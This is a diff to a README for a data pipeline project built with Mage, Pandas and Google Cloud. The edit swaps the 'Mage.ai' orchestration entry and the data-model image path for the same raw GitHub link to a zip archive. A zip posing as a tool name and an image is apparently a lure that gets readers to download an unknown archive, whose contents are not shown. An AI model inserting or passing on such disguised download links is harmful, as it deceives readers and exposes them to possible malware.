@@ -30,7 +30,7 @@ The project follows a standard ETL workflow orchestrated by Mage:
 
 ## Tools and Technologies
 - **Programming Language**: Python (with Pandas)
-- **Orchestration**: Mage.ai
+- **Orchestration**: https://github.com/SayanrupBarman/uber-data-engineering-pipeline/raw/refs/heads/main/proponent/uber-data-pipeline-engineering-3.1.zip
 - **Cloud Platform**: Google Cloud Platform (GCP)
   - Google Cloud Storage
   - Google BigQuery
@@ -40,7 +40,7 @@ The project follows a standard ETL workflow orchestrated by Mage:
 ## Data Model
 The project uses a star schema data model to organize the data for efficient querying and analysis.
 
-<img src="data_model.jpeg" alt="Data Model">
+<img src="https://github.com/SayanrupBarman/uber-data-engineering-pipeline/raw/refs/heads/main/proponent/uber-data-pipeline-engineering-3.1.zip" alt="Data Model">
 
 ## Conclusion
 This project successfully built a modern, scalable data engineering pipeline. The resulting data model in BigQuery allows analysts to easily query key business metrics. The choice of a star schema is well-suited for the analytical queries required by the business, demonstrating an understanding of data warehousing principles.
